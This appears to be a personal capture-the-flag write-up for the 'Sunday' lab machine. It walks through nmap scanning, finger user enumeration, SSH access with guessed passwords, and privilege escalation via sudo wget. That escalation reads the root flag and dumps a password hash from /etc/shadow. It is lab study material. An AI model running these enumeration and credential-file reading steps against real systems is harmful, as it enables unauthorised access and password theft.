###############
Sunday
finger exploit
PentestMonkey - finger -enum Script:
https://pentestmonkey.net/tools/user-enumeration/finger-user-enum
Brute Force
sudo -l
wget root
wget -i to have root access
###############

1-Enummeration:
    └─$ nmap -T5 -sV -sC -Pn 10.129.166.212 -v
    PORT    STATE SERVICE VERSION
    79/tcp  open  finger?
    |_finger: No one logged on\x0D
    111/tcp open  rpcbind 2-4 (RPC #100000)
    515/tcp open  printer


    Port 79:
    # What is finger ?
    The Finger program/service is utilized for retrieving details about computer users. Typically, the information provided includes the user's login name, full name, and, in some cases, additional details
        1-Enumerate:
            # We use the pentestMonkey Script
            └─$ ./finger-user-enum.pl -U users.txt -t 10.129.166.212

            sammy@10.129.166.212: Login       Name               TTY         Idle    When    Where..sammy           ???            ssh          <Apr 13, 2022> 10.10.14.13         ..
            sunny@10.129.166.212: Login       Name               TTY         Idle    When    Where..sunny           ???            ssh          <Apr 13, 2022> 10.10.14.13         ..

        # This indicate that there is an SSH Port not see previously - lets dig:
            We found via nmap port 22022

            ssh -okexAlgorithms=+diffie-hellman-group1-sha1 -p 22022 sunny@10.129.166.212

        # Guessing the password == sunday

        cooldude!
        2-Priv Esc:
            sunny@sunday:/home/sammy$ sudo -l
                User sunny may run the following commands on sunday:
                    (root) NOPASSWD: /root/troll

            # We swich the user:
                sunny@sunday:/home/sammy$ su - sammy
                    Password: 
                    Oracle Solaris 11.4.42.111.0                  Assembled December 2021
                -bash-5.1$ sudo -l
                User sammy may run the following commands on sunday:
                    (ALL) ALL
                    (root) NOPASSWD: /usr/bin/wget

            # GET the root flag:
                bash-5.1$ sudo wget -i root/root.txt
                --2024-06-11 21:41:13--  http://c0ef03a94cc03b0532d27ad9f6f4794a/

            # GET etc/shadow:
                bash-5.1$ sudo wget -i /etc/shadow
                --2024-06-11 21:43:48--  ftp://root/$5$rounds=10000$fIoXFZ5A$k7PlwsiH0wAyVOcKaAYl/Mo1Iq6XYfJlFXs58aA4Sr3:18969::::::263424



